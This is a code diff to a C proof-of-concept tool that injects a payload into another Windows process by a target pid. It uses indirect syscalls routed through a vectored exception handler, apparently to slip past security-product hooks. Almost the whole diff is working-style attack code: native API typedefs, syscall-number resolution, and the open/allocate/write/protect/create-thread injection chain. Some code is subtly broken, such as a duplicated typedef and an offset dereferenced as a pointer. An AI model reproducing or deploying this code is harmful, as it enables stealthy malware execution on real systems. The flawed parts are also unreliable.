@@ -1,7 +1,118 @@
 #pragma once
 #include <Windows.h>
 #include <stdio.h>
-#include "incl.h"
+
+#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
+#define STATUS_INFO_LENGTH_MISMATCH      ((NTSTATUS)0xC0000004L)
+
+
+typedef struct _PS_ATTRIBUTE
+{
+	ULONG  Attribute;
+	SIZE_T Size;
+	union
+	{
+		ULONG Value;
+		PVOID ValuePtr;
+	} u1;
+	PSIZE_T ReturnLength;
+} PS_ATTRIBUTE, * PPS_ATTRIBUTE;
+
+#ifndef InitializeObjectAttributes
+#define InitializeObjectAttributes( p, n, a, r, s ) { \
+	(p)->Length = sizeof( OBJECT_ATTRIBUTES );        \
+	(p)->RootDirectory = r;                           \
+	(p)->Attributes = a;                              \
+	(p)->ObjectName = n;                              \
+	(p)->SecurityDescriptor = s;                      \
+	(p)->SecurityQualityOfService = NULL;             \
+}
+#endif
+
+typedef struct _UNICODE_STRING
+{
+	USHORT Length;
+	USHORT MaximumLength;
+	PWSTR  Buffer;
+} UNICODE_STRING, * PUNICODE_STRING;
+
+typedef struct _OBJECT_ATTRIBUTES
+{
+	ULONG           Length;
+	HANDLE          RootDirectory;
+	PUNICODE_STRING ObjectName;
+	ULONG           Attributes;
+	PVOID           SecurityDescriptor;
+	PVOID           SecurityQualityOfService;
+} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
+
+typedef struct _CLIENT_ID
+{
+	HANDLE UniqueProcess;
+	HANDLE UniqueThread;
+} CLIENT_ID, * PCLIENT_ID;
+
+typedef struct _PS_ATTRIBUTE_LIST
+{
+	SIZE_T       TotalLength;
+	PS_ATTRIBUTE Attributes[1];
+} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;
+
+
+typedef NTSYSAPI NTSTATUS(NTAPI* _NtProtectVirtualMemory)(
+	HANDLE ProcessHandle,
+	PVOID* BaseAddress,
+	PULONG NumberOfBytesToProtect,
+	ULONG NewAccessProtection,
+	PULONG OldAccessProtection);
+
+
+typedef NTSYSAPI NTSTATUS(NTAPI* _NtOpenProcess)(
+	OUT PHANDLE ProcessHandle,
+	IN ACCESS_MASK DesiredAccess,
+	IN POBJECT_ATTRIBUTES ObjectAttributes,
+	IN PCLIENT_ID ClientId OPTIONAL);
+
+typedef NTSYSAPI NTSTATUS(NTAPI* _NtAllocateVirtualMemory)(
+	IN HANDLE ProcessHandle,
+	IN OUT PVOID* BaseAddress,
+	IN ULONG ZeroBits,
+	IN OUT PSIZE_T RegionSize,
+	IN ULONG AllocationType,
+	IN ULONG Protect);
+
+typedef NTSYSAPI NTSTATUS(NTAPI* _NtProtectVirtualMemory)(
+	IN HANDLE ProcessHandle,
+	IN OUT PVOID* BaseAddress,
+	IN OUT PSIZE_T RegionSize,
+	IN ULONG NewProtect,
+	OUT PULONG OldProtect);
+
+typedef NTSYSAPI NTSTATUS(NTAPI* _NtWriteVirtualMemory)(
+	IN HANDLE ProcessHandle,
+	IN PVOID BaseAddress,
+	IN PVOID Buffer,
+	IN SIZE_T NumberOfBytesToWrite,
+	OUT PSIZE_T NumberOfBytesWritten OPTIONAL);
+
+typedef NTSYSAPI NTSTATUS(NTAPI* _NtCreateThreadEx)(
+	OUT PHANDLE ThreadHandle,
+	IN ACCESS_MASK DesiredAccess,
+	IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
+	IN HANDLE ProcessHandle,
+	IN PVOID StartRoutine,
+	IN PVOID Argument OPTIONAL,
+	IN ULONG CreateFlags,
+	IN SIZE_T ZeroBits,
+	IN SIZE_T StackSize,
+	IN SIZE_T MaximumStackSize,
+	IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL);
+
+typedef NTSYSAPI NTSTATUS(NTAPI* _NtFreeVirtualMemory)(
+	IN HANDLE ProcessHandle,
+	IN OUT PVOID* BaseAddress,
+	IN OUT PSIZE_T RegionSize,
+	IN ULONG FreeType);
 
 
 
@@ -47,27 +158,28 @@ ULONG HandleException(PEXCEPTION_POINTERS exception_ptr) {
 		exception_ptr->ContextRecord->Rip = g_syscall_addr;
 		return EXCEPTION_CONTINUE_EXECUTION;
 	}
-	
+
 }
 
-PULONG GetSysCallNumber(const char* FunctionName) {
+ULONG GetSysCallNumber(char* FunctionName) {
 	HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
 	PVOID FunctionAddress = GetProcAddress(ntdll, FunctionName);
 	
-	// getting the address at which the instruciton that will invokes the syscall
+	// Getting the address at which the instruciton that will invokes the syscall
 	BYTE* syscall_instruction = FindSyscallAddr((ULONG_PTR)FunctionAddress);
 
-	PULONG SysCallNumber = 0;
-	PULONG Offset = 0;
+	ULONG SysCallNumber = 0;
+	ULONG Offset = 0;
 
 	// Determine the offset of the function within ntdll.dll
-	Offset = (PULONG)((ULONG_PTR)syscall_instruction - (ULONG_PTR)GetModuleHandleW(L"ntdll.dll"));
+	Offset = (ULONG)((ULONG_PTR)syscall_instruction - (ULONG_PTR)GetModuleHandleW(L"ntdll.dll"));
 
 	// The syscall number is stored in the second half of the instruction
-	SysCallNumber = (PULONG)(Offset + 2);
+	SysCallNumber = *((PULONG)(Offset + 2));
 
 	return SysCallNumber;
 }
+
 
 void VectoredSyscalPOC(unsigned char payload[], SIZE_T payload_size, int pid) {
 	ULONG_PTR syscall_addr = 0x00;
@@ -81,7 +193,7 @@ void VectoredSyscalPOC(unsigned char payload[], SIZE_T payload_size, int pid) {
 	if (syscall_addr == NULL) {
 		printf("[-] Error Resolving syscall Address\n");
 		exit(-1);
-	} 
+	}
 	// storing syscall address globally
 	g_syscall_addr = syscall_addr;
 
@@ -91,23 +203,16 @@ void VectoredSyscalPOC(unsigned char payload[], SIZE_T payload_size, int pid) {
 	NTSTATUS status;
 	// Note: Below syscall might differ system to system 
 	// it's better to grab the syscall numbers dynamically
-	
-	PULONG SysNt1 = GetSysCallNumber("NtOpenProcess");
-	ULONG SysNtOpenProcess = *SysNt1;
 
-	PULONG SysNt2 = GetSysCallNumber("NtAllocateVirtualMemory");
-	ULONG SysNtAllocateVirtualMemory = *SysNt2;
-	
-	PULONG SysNt3 = GetSysCallNumber("NtWriteVirtualMemory");
-	ULONG SysNtWriteVirtualMemory = *SysNt3;
-
-	PULONG SysNt4 = GetSysCallNumber("NtProtectVirtualMemory");
-	ULONG SysNtProtectVirtualMemory = *SysNt4;
-
-	PULONG SysNt5 = GetSysCallNumber("NtCreateThreadEx");
-	ULONG SysNtCreateThreadEx = *SysNt5;
+	ULONG SysNtOpenProcess = GetSysCallNumber("NtOpenProcess");
+	ULONG SysNtAllocateVirtualMemory = GetSysCallNumber("NtAllocateVirtualMemory");
+	ULONG SysNtWriteVirtualMemory = GetSysCallNumber("NtWriteVirtualMemory");
+	ULONG SysNtProtectVirtualMemory = GetSysCallNumber("NtProtectVirtualMemory");
+	ULONG SysNtCreateThreadEx = GetSysCallNumber("NtCreateThreadEx");
+	ULONG SysNtFreeVirtualMemory = GetSysCallNumber("NtFreeVirtualMemory");
 
 
+	// Todo: encode syscall numbers
 	// init Nt APIs
 	// Instead of actual Nt API address we'll set the API with syscall number
 	// and calling each Nt APIs causes an exception which'll be later handled from the
@@ -116,11 +221,11 @@ void VectoredSyscalPOC(unsigned char payload[], SIZE_T payload_size, int pid) {
 	// exception handler via RIP register 
 
 	_NtOpenProcess pNtOpenProcess = (_NtOpenProcess)SysNtOpenProcess;
-	_NtAllocateVirtualMemory pNtAllocateVirtualMemory = (_NtAllocateVirtualMemory)SysNtAllocateVirtualMem;
-	_NtWriteVirtualMemory pNtWriteVirtualMemory = (_NtWriteVirtualMemory)SysNtWriteVirtualMem;
-	_NtProtectVirtualMemory pNtProtectVirtualMemory = (_NtProtectVirtualMemory)SysNtProtectVirtualMem;
+	_NtAllocateVirtualMemory pNtAllocateVirtualMemory = (_NtAllocateVirtualMemory)SysNtAllocateVirtualMemory;
+	_NtWriteVirtualMemory pNtWriteVirtualMemory = (_NtWriteVirtualMemory)SysNtWriteVirtualMemory;
+	_NtProtectVirtualMemory pNtProtectVirtualMemory = (_NtProtectVirtualMemory)SysNtProtectVirtualMemory;
 	_NtCreateThreadEx pNtCreateThreadEx = (_NtCreateThreadEx)SysNtCreateThreadEx;
-
+	_NtFreeVirtualMemory pNtFreeVirtualMemory = (_NtFreeVirtualMemory)SysNtFreeVirtualMemory;
 
 	HANDLE hProcess = { INVALID_HANDLE_VALUE };
 	HANDLE hThread = NULL;
